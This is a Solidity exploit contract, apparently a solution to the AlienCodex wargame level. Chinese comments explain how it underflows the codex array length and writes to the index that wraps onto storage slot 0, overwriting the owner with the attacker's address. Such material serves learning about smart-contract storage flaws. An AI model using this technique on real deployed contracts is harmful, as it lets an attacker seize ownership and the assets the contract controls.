// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    constructor(AlienCodex target) {
        target.makeContact();
        target.retract();

        //存储槽长度 2 ** 256，solidity早期版本codex数组长度减1后会发生下溢，长度为2 ** 256 - 1，
        //然后存储槽第一位的owner和数组的第一位共用一个存储槽，从而可以通过revise覆盖owner变量
        //slot 0     owner（bytes20），contact（byte1）
        //slot 1     codex.length

        //h=keccak(1)  1是声明数组长度的存储槽编号
        //slot h     codex[0]
        //slot h+1     codex[1]
        //slot h+2**256-1     codex[2**256-1]  数组的最后一位，但不是slot0的位置
        //假设codex[i]在slot 0，则h + i = 0，codex[-h]重新回到slot 0
        uint256 h = uint256(keccak256(abi.encode(1)));
        uint256 i;
        unchecked {
            //新版本solidity自带防溢出检查，需要取消
            i -= h;
        }
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}

interface AlienCodex {
    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;

    function owner() external view returns (address);

    function codex(uint256 i) external view returns (bytes32);
}
